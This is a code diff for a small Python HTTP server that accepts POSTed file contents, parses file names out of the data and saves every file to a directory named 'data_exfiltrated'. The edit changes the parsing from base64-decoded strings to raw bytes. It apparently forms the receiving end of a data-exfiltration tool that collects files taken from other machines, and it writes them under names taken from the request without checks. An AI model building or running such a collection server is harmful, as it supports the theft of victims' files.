@@ -31,28 +31,15 @@ class handler(BaseHTTPRequestHandler):
 
 
 
-        received_files=post_data.decode().split("\u0001")
+        received_files=post_data.split(b'\\EndOfFile')[:-1] #deleting last element as it's just an empty bytestr
         for file in received_files :
-                name_file=file.split("file : ")[1].split("\n")[0] #take str between "file" and return (\n)
-                if name_file =="img.png" :
-                
-                    #format file
-                    file = file.split("png\n")[1]
-                    file = file.encode() #repasse en bytestr
-                    file = base64.b64decode(file + b'==') #retour en bytes
-                
-                
-                
-                    print(name_file+" is THAT ONE!")
-                    temp_file_to_write = open("./data_exfiltrated/"+name_file, "wb")
-                    temp_file_to_write.write(file)
-                    temp_file_to_write.close() 
-                else :
-                    print(name_file+" is here!")
-                    print(file)
-                    temp_file_to_write = open("./data_exfiltrated/"+name_file, "w", encoding="UTF-8") 
-                    temp_file_to_write.write(file)
-                    temp_file_to_write.close() 
+                name_file=file.split(b"file : ")[1].split(b"\n")[0] #get file name
+                print(name_file.decode()+" is here!")
+                file=file.split(b"file : ")[1].split(b"\n",1)[1] #get rest of file
+                print(file[:30])
+                temp_file_to_write = open("./data_exfiltrated/"+name_file.decode(), "wb") 
+                temp_file_to_write.write(file)
+                temp_file_to_write.close() 
 
 
 with HTTPServer(('', 8080), handler) as server:
